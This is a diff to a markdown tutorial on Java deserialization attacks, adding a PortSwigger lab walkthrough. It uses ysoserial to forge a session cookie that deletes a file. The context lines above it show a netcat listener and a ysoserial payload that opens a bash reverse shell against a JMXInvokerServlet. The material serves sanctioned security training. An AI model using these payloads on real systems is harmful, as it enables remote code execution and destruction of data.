@@ -795,3 +795,26 @@ nc -lvnp 1337
 java -jar ysoserial-all.jar CommonsCollections1 "/bin/bash -c {/bin/echo,$PAYLOAD}|{/usr/bin/base64,-d}|{/bin/bash,-i}" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
 ```
 - You will have a reverse shell gained in your netcat listener.
+
+
+**Lab: Exploiting Java deserialization with Apache Commons**
+Let's take an another lab example for Java Insecure Deserialization. We can access this lab from [PortSwigger Academy.](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
+- As usual, navigate into above link and login using your portswigger account.
+- Click on Access the lab, here the goal is to use a third-party tool to generate a malicious serialized object containing a remote code execution payload and delete the morale.txt file from Carlo's home directory.
+- Navigate to My Account section and login with credentials **wiener:peter**.
+- If we intercept the request after login, we can see the session cookie on the request.
+![image](https://user-images.githubusercontent.com/47778874/228304320-e33bd933-17d8-4e5f-ad26-054a4cc08338.png)
+
+- The session cookie seems to have a different format then that we have exploited during PHP Insecure Deserialization lab. The cookie contains **rO0AB** headers on it which determines that it is the Base64 encoded Java Serialized object as discussed on previous lab.
+- As the lab requires third party tool to generate the malicious payload, let's use ysoserial.
+
+    ```bash
+    wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+    java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+    ```
+- Here we used the gadget as **CommonCollections4**. How did I know it? Tried with **CommonsCollections1**, **CommonsCollections2** and so on.
+- Replace the output with session cookie on the repeater and send the request.
+![image](https://user-images.githubusercontent.com/47778874/228308291-8fd6a26c-10ac-41d9-ac3c-96acf71e5865.png)
+
+- The file morale.txt will be deleted and lab is solved.
+![image](https://user-images.githubusercontent.com/47778874/228307783-8242c6c2-eb12-49fd-8210-f4bf0578ba6d.png)
